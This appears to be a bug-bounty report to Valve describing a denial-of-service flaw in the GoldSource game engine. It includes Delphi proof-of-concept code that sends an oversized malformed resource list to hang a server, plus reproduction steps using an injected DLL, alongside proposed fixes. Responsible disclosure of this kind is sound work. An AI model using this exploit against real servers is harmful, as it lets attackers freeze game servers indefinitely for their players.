# Malformed client to server resource block in GoldSource causes server hang

# Introduction

Client and server in GoldSource engine have the ability to exchange files with each other. The client, as a rule, uploads decals, that is, sprays that can be painted on surfaces, and the server gives back maps, models, sounds, decals as well, and many other things. In this report, I would like to tell how attacker can cause a very long server hangup (in theory - infinite) by malformed packet.

Dear HackerOne team. I studied Valve's policy and, again, ran into some confusion. The vulnerability I want to report is hangups the server. However, the server does not close with an error, it just hangs, not responding to any commands. Freezing takes a long time, theoretically it can last indefinitely, because an attacker can send a new packet when the server "wakes up" (what will happen in a very long time). Can this issue be in the scope? If not, please let me know about it, I will close the report myself. Thanks.

# Description

When connecting to server, client sends information about resources it would like to upload to server. Under normal circumstances, the client only sends the spray, which is stored in tempdecal.wad file. However, an attacker can generate an unusually large list, resulting in a server freeze. I managed to generate a list of resources from only 7280 elements, because if I try to create a list larger, then the server-side network buffer where the packets are stored will be full and the packet will be damaged. Therefore, a list of 7280 items is optimal.

I will attach the code for generating the list of resources that causes the hang.

```delphi
procedure hkCL_SendResourceListBlock; cdecl;
const
  ResourceCount = 7280;
type
  TBlockResource = packed record
    Name: array[0..0] of AnsiChar;
    &Type: Byte;
    Index: Word;
    Size: Longint;
    Flags: Byte;
  end;
var
  I: Integer;

  MsgData: array of TBlockResource;
  Msg: sizebuf_t;
begin
  MSG_ReadLong;
  MSG_ReadLong;

  SetLength(MsgData, ResourceCount);

  Msg.buffername := 'Malformed Client to Server Resource Block';
  Msg.flags := 0;
  Msg.data := @MsgData[0];
  Msg.maxsize := 1 + 2 + Length(MsgData) * SizeOf(MsgData[0]);
  Msg.cursize := 0;

  MSG_WriteByte(Msg, Ord(clc_resourcelist));
  MSG_WriteShort(Msg, ResourceCount);

  for I := 0 to Length(MsgData) - 1 do
  begin
    MSG_WriteString(Msg, '');
    MSG_WriteByte(Msg, Ord(t_model));
    MSG_WriteShort(Msg, I);
    MSG_WriteLong(Msg, -1);
    MSG_WriteByte(Msg, 0);
  end;

  if Msg.cursize > 0 then
  begin
    Netchan_CreateFragments(False, CS^.netchan, Msg);
    Netchan_FragSend(CS^.netchan);
  end;
end;
```

This function is called instead of the original one, forming a malformed resource packet. There is no need to call the original function.

As soon as the server receives this list, it will start processing it inside the SV_RegisterResources function. This function sends the received spray from the client to other connected clients. All received resources are processed, in our case - 7280. An additional problem with the function is an error in the loop. The SV_CreateCustomizationList function, which is called each iteration, creates additional load on the loop. This function should be called only once to create a new list of resources, no more. The original function looks like this:

```cpp
void __cdecl SV_RegisterResources()
{
  int v0; // edi@1
  resource_t *i; // esi@1

  v0 = host_client;
  host_client->uploading = 0;
  for ( i = *(v0 + 19892); i != (v0 + 19764); i = i->pNext )
  {
    SV_CreateCustomizationList(v0);
    SV_Customization(v0, i, 1);
  }
  host_client = v0;
}
```

To reduce the load, it should look like this:

```
void __cdecl SV_RegisterResources()
{
  int v0; // edi@1
  resource_t *i; // esi@1

  v0 = host_client;
  host_client->uploading = 0;
  
  SV_CreateCustomizationList(v0);
  for ( i = *(v0 + 19892); i != (v0 + 19764); i = i->pNext )
  {
    SV_Customization(v0, i, 1);
  }
  host_client = v0;
}
```

I also recorded a video demonstrating how the vulnerability works:

{F1006945}

# How to reproduce

As in the previous reports related to attacks against the server, I developed a library that performs the attack. The instructions for use are as follows:

1. Put the TrackerUI.dll file in the 'cstrike\bin' folder;
2. Launch Counter-Strike 1.6;
3. Run the console command 'exploit_resources' while in menu;
4. Connect to HLDS.

When reaching a certain stage of connection, the server hangs indefinitely.

# How to fix

I can offer several ways to solve this problem:

1. Add a check for the amount of resources received from the client inside the SV_ParseResourceList function. Since the client always only sends a spray, the server should exclude the client if he sent more than one resource.

2. Add a check of the received resource inside the SV_ParseResourceList function. Something like `if (resource->type != t_decal || !(Resource-> ucFlags & RES_CUSTOM) || resource->nDownloadSize <= 0)` should be sufficient. This check will prevent loading files with incorrect size and files that are not decals. If the check fails, then the client will be excluded from the server.

3. Call the SV_CreateCustomizationList function inside SV_RegisterResources only once, before executing the loop. This will optimize loop performance and reduce its stress.

Ideally, all fixes should be combined.

## Impact

An attacker can cause the server hang for an unlimited amount of time.